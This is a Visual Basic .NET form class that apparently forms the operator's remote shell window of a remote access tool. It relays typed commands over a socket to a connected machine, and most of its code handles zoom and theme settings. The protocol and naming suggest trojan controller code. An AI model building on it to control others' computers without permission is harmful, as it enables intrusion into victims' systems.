Public Class RemoteShell
    Public sock As Integer
    Public Yy As String = "|SPX|"
    Dim FontSizeDef As Integer = 9

    Private Sub RemoteShell_FormClosing(ByVal sender As System.Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing
        Form1.S.Send(sock, "rs" & Yy & ENB("exit"))
        TextBox1.Clear()
        Form1.S.Send(sock, "rsc" & Yy)
    End Sub

    Private Sub RemoteShell_KeyDown(ByVal sender As System.Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles TextBox1.KeyDown, RichTextBox1.KeyDown, MyBase.KeyDown
        If e.KeyCode = Keys.Enter Then
            Form1.S.Send(sock, "rs" & Yy & ENB(TextBox1.Text))
            TextBox1.Clear()
        End If
    End Sub

    Private Sub TextBox1_KeyDown(sender As Object, e As KeyEventArgs) Handles TextBox1.KeyDown
        If e.KeyCode = Keys.Enter Then
            Form1.S.Send(sock, "rs" & Yy & ENB(TextBox1.Text))
            TextBox1.Clear()
        End If
    End Sub
    Private Sub RemoteShell_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

    End Sub

    Private Sub RichTextBox1_TextChanged(sender As Object, e As EventArgs) Handles RichTextBox1.TextChanged

    End Sub

    Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork

    End Sub

    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles TextBox1.TextChanged

    End Sub

    Private Sub ZoomInToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ZoomInToolStripMenuItem.Click
        FontSizeDef += 1
        RichTextBox1.Font = New Font("Consolas", FontSizeDef)
    End Sub

    Private Sub ZoomOutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ZoomOutToolStripMenuItem.Click
        FontSizeDef -= 1
        RichTextBox1.Font = New Font("Consolas", FontSizeDef)
    End Sub

    Private Sub RestoreToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestoreToolStripMenuItem.Click
        FontSizeDef = 9
        RichTextBox1.Font = New Font("Consolas", FontSizeDef)
    End Sub

    Private Sub SwitchToDarkThemeToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SwitchToDarkThemeToolStripMenuItem.Click
        If SwitchToDarkThemeToolStripMenuItem.Text = "Switch to Dark theme" Then
            Me.BackColor = Color.Black

            RichTextBox1.BackColor = Color.Black
            RichTextBox1.ForeColor = Color.White
            RichTextBox1.BorderStyle = BorderStyle.FixedSingle

            TextBox1.BackColor = Color.Black
            TextBox1.ForeColor = Color.White
            TextBox1.BorderStyle = BorderStyle.FixedSingle

            SwitchToDarkThemeToolStripMenuItem.Text = "Switch To Default theme"
        ElseIf SwitchToDarkThemeToolStripMenuItem.Text = "Switch To Default theme" Then
            Me.BackColor = Color.FromKnownColor(KnownColor.Control)


            RichTextBox1.BackColor = Color.White
            RichTextBox1.ForeColor = Color.Black
            RichTextBox1.BorderStyle = BorderStyle.Fixed3D

            TextBox1.BackColor = Color.FromKnownColor(KnownColor.Window)
            TextBox1.ForeColor = Color.Black
            TextBox1.BorderStyle = BorderStyle.Fixed3D

            SwitchToDarkThemeToolStripMenuItem.Text = "Switch to Dark theme"
        End If
    End Sub
End Class